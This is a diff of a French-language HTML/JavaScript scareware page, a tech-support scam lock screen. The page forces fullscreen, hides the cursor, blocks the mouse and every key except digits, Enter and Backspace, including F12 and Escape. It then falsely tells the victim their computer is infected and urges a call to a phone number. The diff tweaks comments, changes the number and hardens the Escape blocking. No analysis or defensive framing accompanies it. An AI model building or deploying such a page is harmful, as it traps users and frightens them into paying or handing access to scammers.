@@ -10,7 +10,7 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
-            cursor: none; /* Désactive le curseur */
+            cursor: none; /* Désactive totalement le curseur */
         }
         html, body {
             width: 100vw;
@@ -64,7 +64,7 @@
 
     <div class="container">
         <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 6 XX XX XX 07</p>
+        <p class="alert-number">+33 6 XX XX XX 08</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message"></p>
@@ -89,7 +89,7 @@
         }
         openFullscreen();
 
-        // Désactiver tous les raccourcis clavier (F12, Ctrl+Shift+I, Alt+Tab, Échap...)
+        // Bloquer tous les raccourcis clavier
         document.addEventListener("keydown", function(event) {
             let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace"];
             if (!allowedKeys.includes(event.key)) {
@@ -97,14 +97,15 @@
             }
         });
 
-        // Bloquer la touche Échap en continu
+        // Désactiver totalement la touche Échap
         document.addEventListener("keydown", function(event) {
             if (event.key === "Escape") {
                 event.preventDefault();
+                return false;
             }
         });
 
-        // Désactiver la souris complètement
+        // Désactiver complètement la souris
         document.addEventListener("mousemove", function(event) {
             event.preventDefault();
         });
